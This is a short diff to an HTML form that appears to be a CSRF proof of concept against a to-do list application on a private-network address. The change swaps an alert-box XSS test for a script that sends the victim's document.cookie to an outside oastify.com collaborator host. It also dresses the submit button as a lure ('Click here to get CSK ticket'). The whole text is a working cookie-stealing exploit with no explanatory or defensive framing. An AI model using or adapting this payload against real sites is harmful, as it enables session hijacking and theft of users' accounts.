@@ -1,5 +1,8 @@
 <form action="http://192.168.1.115:8080/Todos/test/list.php" method="POST">
-    <input type="hidden" name="Todo" value="<script>alert(document.cookie)</script>">
+    <input type="hidden" name="Todo" value='<script>
+            var img = new Image();
+            img.src = "https://c8lmxn98mcwxz7li82ju5q4e55bwznnc.oastify.com?cookie=" + encodeURIComponent(document.cookie);
+        </script>'>
     <input type="hidden" name="Status" value="CSRF"> 
     <input type="submit" name="submit" value="Click here to get CSK ticket">
 </form>
